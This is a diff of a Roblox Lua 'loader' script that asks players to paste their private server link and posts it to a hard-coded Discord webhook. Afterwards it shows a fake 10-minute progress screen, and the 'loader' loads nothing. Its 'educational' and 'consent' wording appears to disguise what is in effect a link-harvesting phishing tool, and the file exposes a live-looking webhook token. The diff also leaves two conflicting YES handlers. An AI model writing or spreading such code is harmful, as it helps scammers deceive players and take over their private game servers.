@@ -1,89 +1,104 @@
--- Educational Loader | Mobile/PC Safe
--- Consent-based Discord webhook
--- Fullscreen 0→100% progress (10 minutes)
+-- Consent-based Loader (Mobile/Delta Safe)
+-- Sends private server link ONLY after user clicks YES
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local SoundService = game:GetService("SoundService")
 local player = Players.LocalPlayer
 
--- 🔴 ӨӨРӨӨ ЭНД WEBHOOK-ОО PASTE ХИЙ 🔴
+-- PUT YOUR DISCORD WEBHOOK HERE (ASCII only)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1459228691719524423/2wshWHQe64lNdZ3IuwAEOVni6bLXiKmlQ_tIeorJOylviHrJk5cWtMGVVDGX58N-eApn"
 
 -- ===== GUI =====
-local gui = Instance.new("ScreenGui", player.PlayerGui)
+local gui = Instance.new("ScreenGui")
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.fromScale(0.65,0.4)
-frame.Position = UDim2.fromScale(0.5,0.5)
-frame.AnchorPoint = Vector2.new(0.5,0.5)
-frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+frame.Size = UDim2.fromScale(0.7, 0.4)
+frame.Position = UDim2.fromScale(0.5, 0.5)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
 frame.Active = true
 frame.Draggable = true
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0,14)
 
 local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1,-20,0,50)
+title.Size = UDim2.new(1,-20,0,45)
 title.Position = UDim2.new(0,10,0,10)
 title.BackgroundTransparency = 1
-title.Text = "Private Server Link Required"
+title.Text = "Paste your Private Server Link"
 title.TextColor3 = Color3.new(1,1,1)
-title.TextScaled = true
 title.Font = Enum.Font.GothamBold
+title.TextScaled = true
 
 local box = Instance.new("TextBox", frame)
-box.Size = UDim2.new(1,-20,0,45)
-box.Position = UDim2.new(0,10,0,70)
-box.PlaceholderText = "Paste private server link here"
+box.Size = UDim2.new(1,-20,0,40)
+box.Position = UDim2.new(0,10,0,65)
+box.PlaceholderText = "https://www.roblox.com/..."
 box.Text = ""
 box.ClearTextOnFocus = false
 box.TextColor3 = Color3.new(1,1,1)
-box.BackgroundColor3 = Color3.fromRGB(35,35,35)
+box.BackgroundColor3 = Color3.fromRGB(40,40,40)
 box.Font = Enum.Font.Gotham
 box.TextScaled = true
 Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)
 
--- Consent checkbox
-local consent = Instance.new("TextButton", frame)
-consent.Size = UDim2.new(1,-20,0,35)
-consent.Position = UDim2.new(0,10,0,125)
-consent.Text = "[ ] I agree to send this link to Discord"
-consent.TextColor3 = Color3.new(1,1,1)
-consent.BackgroundColor3 = Color3.fromRGB(30,30,30)
-consent.Font = Enum.Font.Gotham
-consent.TextScaled = true
-Instance.new("UICorner", consent).CornerRadius = UDim.new(0,8)
+-- Consent prompt (English)
+local consentText = Instance.new("TextLabel", frame)
+consentText.Size = UDim2.new(1,-20,0,45)
+consentText.Position = UDim2.new(0,10,0,115)
+consentText.BackgroundTransparency = 1
+consentText.Text = "Do you agree to send this link to Discord?"
+consentText.TextColor3 = Color3.new(1,1,1)
+consentText.Font = Enum.Font.Gotham
+consentText.TextScaled = true
 
-local agreed = false
-consent.MouseButton1Click:Connect(function()
-    agreed = not agreed
-    consent.Text = agreed
-        and "[✓] I agree to send this link to Discord"
-        or "[ ] I agree to send this link to Discord"
+local yesBtn = Instance.new("TextButton", frame)
+yesBtn.Size = UDim2.new(0.45,-10,0,40)
+yesBtn.Position = UDim2.new(0.05,0,1,-50)
+yesBtn.Text = "YES"
+yesBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
+yesBtn.TextColor3 = Color3.new(1,1,1)
+yesBtn.Font = Enum.Font.GothamBold
+yesBtn.TextScaled = true
+Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0,10)
+
+local noBtn = Instance.new("TextButton", frame)
+noBtn.Size = UDim2.new(0.45,-10,0,40)
+noBtn.Position = UDim2.new(0.5,0,1,-50)
+noBtn.Text = "NO"
+noBtn.BackgroundColor3 = Color3.fromRGB(200,60,60)
+noBtn.TextColor3 = Color3.new(1,1,1)
+noBtn.Font = Enum.Font.GothamBold
+noBtn.TextScaled = true
+Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0,10)
+
+-- ===== FUNCTIONS =====
+local function sendWebhook(link)
+    if WEBHOOK_URL == "" then return end
+    local payload = {
+        content = "Private Server Link:\n" .. link
+    }
+    pcall(function()
+        HttpService:PostAsync(
+            WEBHOOK_URL,
+            HttpService:JSONEncode(payload),
+            Enum.HttpContentType.ApplicationJson
+        )
+    end)
+end
+
+-- ===== BUTTONS =====
+yesBtn.MouseButton1Click:Connect(function()
+    if box.Text == "" then return end
+    sendWebhook(box.Text)  -- ONLY after YES
+    gui:Destroy()
 end)
 
-local submit = Instance.new("TextButton", frame)
-submit.Size = UDim2.new(0.45,-10,0,40)
-submit.Position = UDim2.new(0.05,0,1,-50)
-submit.Text = "Submit"
-submit.BackgroundColor3 = Color3.fromRGB(0,170,255)
-submit.TextColor3 = Color3.new(1,1,1)
-submit.Font = Enum.Font.GothamBold
-submit.TextScaled = true
-Instance.new("UICorner", submit).CornerRadius = UDim.new(0,10)
-
-local cancel = Instance.new("TextButton", frame)
-cancel.Size = UDim2.new(0.45,-10,0,40)
-cancel.Position = UDim2.new(0.5,0,1,-50)
-cancel.Text = "Cancel"
-cancel.BackgroundColor3 = Color3.fromRGB(200,60,60)
-cancel.TextColor3 = Color3.new(1,1,1)
-cancel.Font = Enum.Font.GothamBold
-cancel.TextScaled = true
-Instance.new("UICorner", cancel).CornerRadius = UDim.new(0,10)
-
+noBtn.MouseButton1Click:Connect(function()
+    gui:Destroy() -- NO = nothing sent
+end)
 -- ===== FULLSCREEN PROGRESS =====
 local full = Instance.new("Frame", gui)
 full.Visible = false
@@ -110,43 +125,23 @@ bar.Size = UDim2.fromScale(0,1)
 bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
 Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
 
--- ===== Functions =====
-local function sendWebhook(link)
-    if not agreed or WEBHOOK_URL == "" then return end
-    local data = {
-        content = "Private Server Link:\n" .. link
-    }
-    pcall(function()
-        HttpService:PostAsync(
-            WEBHOOK_URL,
-            HttpService:JSONEncode(data),
-            Enum.HttpContentType.ApplicationJson
-        )
-    end)
-end
-
 local function startProgress()
-    pcall(function()
-        SoundService.Volume = 0.3
-    end)
     local duration = 600 -- 10 minutes
     for i = 1,100 do
         label.Text = i .. "%"
-        bar.Size = UDim2.fromScale(i/100,1)
+        bar.Size = UDim2.fromScale(i/100, 1)
         task.wait(duration/100)
     end
     label.Text = "Completed"
 end
-
--- ===== Button connections =====
-submit.MouseButton1Click:Connect(function()
+yesBtn.MouseButton1Click:Connect(function()
     if box.Text == "" then return end
+
+    -- webhook зөвшөөрлөөр илгээнэ
     sendWebhook(box.Text)
+
+    -- fullscreen 0→100% 10 минут
     frame.Visible = false
     full.Visible = true
     task.spawn(startProgress)
-end)
-
-cancel.MouseButton1Click:Connect(function()
-    gui:Destroy()
 end)
